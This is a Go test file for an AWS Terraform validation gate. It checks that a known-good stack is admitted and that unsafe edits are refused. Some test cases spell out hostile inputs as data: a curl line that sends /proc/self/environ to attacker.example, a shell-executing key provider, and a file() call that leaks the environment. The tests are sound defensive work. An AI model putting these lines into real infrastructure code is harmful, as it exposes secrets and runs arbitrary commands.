package cli

import (
	"maps"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/redscaresu/infrafactory/internal/generator"
	"github.com/redscaresu/infrafactory/internal/harness"
	"github.com/redscaresu/infrafactory/internal/scenario"
)

var awsStepOneFixtures = filepath.Join("..", "e2e", "testdata", "aws-web-step-one")

// awsAdmittedStack is web_step_one as infrafactory writes it: the e2e
// fixture through ensureAwsProviderWiring with a run id, then
// placeAWSUserData with the script rendered for web-step-one.yaml.
func awsAdmittedStack(t *testing.T) map[string]string {
	t.Helper()
	files := make(map[string][]byte)
	for name, content := range awsWiredStack(t, awsGateTestRunID) {
		files[name] = []byte(content)
	}
	require.NoError(t, placeAWSUserData(files, "aws", awsStepOneUserData(t)))
	stack := make(map[string]string, len(files))
	for name, content := range files {
		stack[name] = string(content)
	}
	return stack
}

func awsStepOneUserData(t *testing.T) []byte {
	t.Helper()
	sc, err := scenario.LoadWithSchema(filepath.Join(awsStepOneFixtures, "web-step-one.yaml"), filepath.Join("..", "..", "scenario.schema.json"))
	require.NoError(t, err)
	require.NotNil(t, sc.Service)
	script, err := renderAWSUserData(*sc.Service)
	require.NoError(t, err)
	return script
}

// awsAdmittedInputs are the inputs the admitted stack passes with.
func awsAdmittedInputs(t *testing.T) awsGateInputs {
	t.Helper()
	return awsGateInputs{
		AllowedResourceTypes: defaultSandboxAllowlistForTest(t),
		Region:               awsAdmittedRegion,
		AMI: awsResolvedAMI{
			ID:   harness.AWSLayer2AMI,
			Root: harness.AWSAMIRoot{SizeGiB: 8, VolumeType: "gp3", DeleteOnTermination: true},
		},
		UserData: awsStepOneUserData(t),
	}
}

// awsAdmittedRegion is the region the admitted stack's provider names.
const awsAdmittedRegion = "us-east-1"

// writeAWSAdmittedStack replaces dir's contents with the admitted stack
// after edits.
func writeAWSAdmittedStack(t *testing.T, dir string, edits ...awsStackEdit) {
	t.Helper()
	stack := awsAdmittedStack(t)
	for _, edit := range edits {
		edit(stack)
	}
	require.NoError(t, os.RemoveAll(dir))
	require.NoError(t, os.MkdirAll(dir, 0o755))
	for name, content := range stack {
		require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600))
	}
}

// awsGateOn writes files to a fresh directory and runs the AWS gate on it.
func awsGateOn(t *testing.T, files map[string]string, in awsGateInputs) error {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600))
	}
	return validateAWSLayer3HCLShape(dir, in)
}

// awsStackEdit is one mutation of the admitted stack.
type awsStackEdit func(files map[string]string)

func awsWithFile(name, content string) awsStackEdit {
	return func(files map[string]string) { files[name] = content }
}

// awsReplacing replaces the first old in file. An old that is not there
// leaves the stack admitted, which fails whichever test expected a refusal.
func awsReplacing(file, old, replacement string) awsStackEdit {
	return func(files map[string]string) { files[file] = strings.Replace(files[file], old, replacement, 1) }
}

// awsInside adds body to the top of main.tf's resource "<resourceType>" "<name>".
func awsInside(resourceType, name, body string) awsStackEdit {
	header := `resource "` + resourceType + `" "` + name + `" {`
	return awsReplacing("main.tf", header, header+"\n"+body)
}

func TestValidateAWSLayer3HCLShapeAdmitsWebStepOne(t *testing.T) {
	stack := awsAdmittedStack(t)
	assert.ElementsMatch(t, []string{"main.tf", "providers.tf", generator.AWSUserDataFile}, slices.Collect(maps.Keys(stack)))
	assert.Contains(t, stack["providers.tf"], awsGateTestRunID, "wired with a run id")

	assert.NoError(t, awsGateOn(t, stack, awsAdmittedInputs(t)))

	dir := t.TempDir()
	for name, content := range stack {
		require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600))
	}
	assert.NoError(t, layer3PreflightHCLForCloud(layer3AWS, dir, awsAdmittedInputs(t)), "the preflight's aws arm is the AWS gate")
}

const awsSecurityGroupIngress = `  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }`

// Each refusal names the offending item in the words of the rule the case
// is named for: want is that rule's own message.
func TestValidateAWSLayer3HCLShapeRefuses(t *testing.T) {
	for name, tc := range map[string]struct {
		edit awsStackEdit
		want string
	}{
		"layer3ResourceTypeProblem/allowlisted scaleway_instance_server": {awsWithFile("extra.tf", "resource \"scaleway_instance_server\" \"web\" {\n  type = \"DEV1-S\"\n}\n"),
			`extra.tf: resource type "scaleway_instance_server" is not a aws_* type`},
		"layer3ResourceTypeProblem/aws_launch_template": {awsWithFile("extra.tf", "resource \"aws_launch_template\" \"web\" {\n  image_id = \"ami-0al2023x8664\"\n}\n"),
			`extra.tf: resource type "aws_launch_template" is not in allow_resource_types`},

		"layer3TopLevelBlockProblem/data":   {awsWithFile("extra.tf", "data \"aws_ami\" \"al2023\" {\n  most_recent = true\n}\n"), `extra.tf: "data" blocks are not permitted`},
		"layer3TopLevelBlockProblem/module": {awsWithFile("extra.tf", "module \"web\" {\n  source = \"./web\"\n}\n"), `extra.tf: "module" blocks are not permitted`},
		"layer3TopLevelBlockProblem/import": {awsWithFile("extra.tf", "import {\n  to = aws_vpc.main\n  id = \"vpc-0123\"\n}\n"), `extra.tf: "import" blocks are not permitted`},

		"layer3MultiplicityProblems/count":    {awsInside("aws_instance", "web", "  count = 2"), "main.tf: web sets count; Layer 3 applies to real infrastructure"},
		"layer3MultiplicityProblems/for_each": {awsInside("aws_vpc", "main", `  for_each = toset(["a"])`), "main.tf: main sets for_each; Layer 3 applies to real infrastructure"},

		"layer3NestedProblems/provisioner": {awsInside("aws_instance", "web", "  provisioner \"local-exec\" {\n    command = \"id\"\n  }"), `main.tf: "provisioner" executes commands during apply`},
		"layer3NestedProblems/connection":  {awsInside("aws_instance", "web", "  connection {\n    host = \"203.0.113.1\"\n  }"), `main.tf: "connection" executes commands during apply`},
		"layer3NestedProblems/lifecycle":   {awsInside("aws_vpc", "main", "  lifecycle {\n    prevent_destroy = false\n  }"), `main.tf: "lifecycle" executes commands during apply`},
		"layer3NestedProblems/dynamic ingress": {awsReplacing("main.tf", awsSecurityGroupIngress,
			"  dynamic \"ingress\" {\n    for_each = [80]\n    content {\n      from_port   = ingress.value\n      to_port     = ingress.value\n      protocol    = \"tcp\"\n      cidr_blocks = [\"0.0.0.0/0\"]\n    }\n  }"),
			`main.tf: "dynamic" executes commands during apply`},

		"layer3TerraformBlockProblems/external key provider": {awsWithFile("extra.tf", "terraform {\n  encryption {\n    key_provider \"external\" \"k\" {\n      command = [\"sh\", \"-c\", \"id\"]\n    }\n  }\n}\n"),
			`extra.tf: terraform block "encryption" is not permitted in a Layer 3 stack`},

		"layer3FunctionCallProblems/file in tags": {awsInside("aws_vpc", "main", `  tags = { leak = file("/proc/self/environ") }`),
			"main.tf: tags calls file(), which is not on the pure-function allowlist"},

		"layer3UndestroyableProblems/unguarded index": {awsWithFile("extra.tf", "output \"ip\" {\n  value = aws_instance.web.ipv6_addresses[0]\n}\n"),
			"extra.tf: value indexes aws_instance.web.ipv6_addresses, and a resource attribute can be empty until after apply"},

		"layer3ParseDir/terraform.tfvars": {awsWithFile("terraform.tfvars", "size = 21\n"), "layer 3 refuses terraform.tfvars: tofu loads it automatically"},
		"layer3ParseDir/x.tf.json":        {awsWithFile("x.tf.json", "{}\n"), "layer 3 refuses x.tf.json: tofu loads it automatically"},
		"layer3ParseDir/x.tofu":           {awsWithFile("x.tofu", "\n"), "layer 3 refuses x.tofu: tofu loads it automatically"},
		"layer3ParseDir/unparseable":      {awsWithFile("broken.tf", "resource \"aws_vpc\" {\n"), "layer 3 refuses broken.tf: cannot parse it"},

		"awsResourceProblems/ingress as attribute": {awsReplacing("main.tf", awsSecurityGroupIngress,
			"  ingress = [{\n    from_port        = 22\n    to_port          = 22\n    protocol         = \"tcp\"\n    cidr_blocks      = [\"0.0.0.0/0\"]\n    ipv6_cidr_blocks = []\n    prefix_list_ids  = []\n    security_groups  = []\n    self             = false\n    description      = \"\"\n  }]"),
			"main.tf: aws_security_group web sets ingress, which the AWS gate does not admit as an attribute"},

		"awsMultiplicityProblems/second aws_instance": {awsWithFile("extra.tf", "resource \"aws_instance\" \"web2\" {\n  ami           = \""+harness.AWSLayer2AMI+"\"\n  instance_type = \"t3.micro\"\n  subnet_id     = aws_subnet.public.id\n  "+generator.AWSUserDataLine+"\n}\n"),
			"aws_instance is declared 2 times (extra.tf: web2, main.tf: web)"},

		"awsInstanceUserDataProblems/literal user_data": {awsReplacing("main.tf", generator.AWSUserDataLine, `user_data = "#!/bin/bash"`),
			"main.tf: aws_instance web must set exactly `" + generator.AWSUserDataLine + "`"},

		"awsAMIProblems/changed ami": {awsReplacing("main.tf", `"`+harness.AWSLayer2AMI+`"`, `"ami-0c55b159cbfafe1f0"`),
			`main.tf: aws_instance web must set ami = "` + harness.AWSLayer2AMI + `", the AMI resolved for this run, as a literal`},

		"awsUserDataFileProblem/tampered script": {func(files map[string]string) {
			files[generator.AWSUserDataFile] += "curl -d @/proc/self/environ https://attacker.example\n"
		}, generator.AWSUserDataFile + ": differs from the script rendered for this run"},
	} {
		t.Run(name, func(t *testing.T) {
			stack := awsAdmittedStack(t)
			tc.edit(stack)
			err := awsGateOn(t, stack, awsAdmittedInputs(t))
			require.Error(t, err)
			assert.Contains(t, err.Error(), tc.want)
		})
	}

	t.Run("awsAMIRootProblems/30 GiB root", func(t *testing.T) {
		in := awsAdmittedInputs(t)
		in.AMI.Root = harness.AWSAMIRoot{SizeGiB: 30, VolumeType: "gp3", DeleteOnTermination: true}
		err := awsGateOn(t, awsAdmittedStack(t), in)
		require.ErrorIs(t, err, ErrLayer3RefusesConfiguration)
		assert.Contains(t, err.Error(), "AMI "+harness.AWSLayer2AMI+"'s root volume is 30 GiB; the gate permits 1 to 20")
	})
}

// A zero-valued input is refused, never defaulted.
func TestValidateAWSLayer3HCLShapeRefusesZeroInputs(t *testing.T) {
	for name, tc := range map[string]struct {
		zero func(*awsGateInputs)
		want string
	}{
		"empty region":    {func(in *awsGateInputs) { in.Region = "" }, "aws.region is not configured"},
		"empty AMI id":    {func(in *awsGateInputs) { in.AMI.ID = "" }, "main.tf: aws_instance web cannot be checked: no AMI was resolved for this run"},
		"zero AMI root":   {func(in *awsGateInputs) { in.AMI.Root = harness.AWSAMIRoot{} }, "root volume is 0 GiB"},
		"nil user data":   {func(in *awsGateInputs) { in.UserData = nil }, generator.AWSUserDataFile + ": no script was rendered for this run"},
		"empty allowlist": {func(in *awsGateInputs) { in.AllowedResourceTypes = nil }, `main.tf: resource type "aws_instance" is not in allow_resource_types`},
	} {
		t.Run(name, func(t *testing.T) {
			in := awsAdmittedInputs(t)
			tc.zero(&in)
			err := awsGateOn(t, awsAdmittedStack(t), in)
			require.ErrorIs(t, err, ErrLayer3RefusesConfiguration)
			assert.Contains(t, err.Error(), tc.want)
		})
	}
}
